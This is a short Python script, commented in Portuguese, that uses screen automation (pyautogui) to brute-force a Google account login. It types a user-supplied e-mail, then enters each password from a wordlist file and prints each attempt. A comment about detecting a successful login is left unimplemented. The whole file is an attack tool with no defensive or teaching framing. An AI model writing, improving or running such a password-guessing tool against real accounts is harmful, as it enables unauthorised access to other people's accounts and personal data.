
import time
import pyautogui

url = "https://accounts.google.com/"
user = input("\nE-mail: ")

wordlist = open('wordlist.txt', 'r').readlines()
pyautogui.click(x=891,y=526)
time.sleep(1)
pyautogui.write(user)   
time.sleep(1)
pyautogui.press('enter')
for senha in wordlist:
    time.sleep(1)
    pyautogui.write(senha)
    print(f"Senha testada ---> {senha}")
    time.sleep(1)
    pyautogui.press('enter')
    time.sleep(3)
    # requisiçao para pegar parametros na tela caso faça login
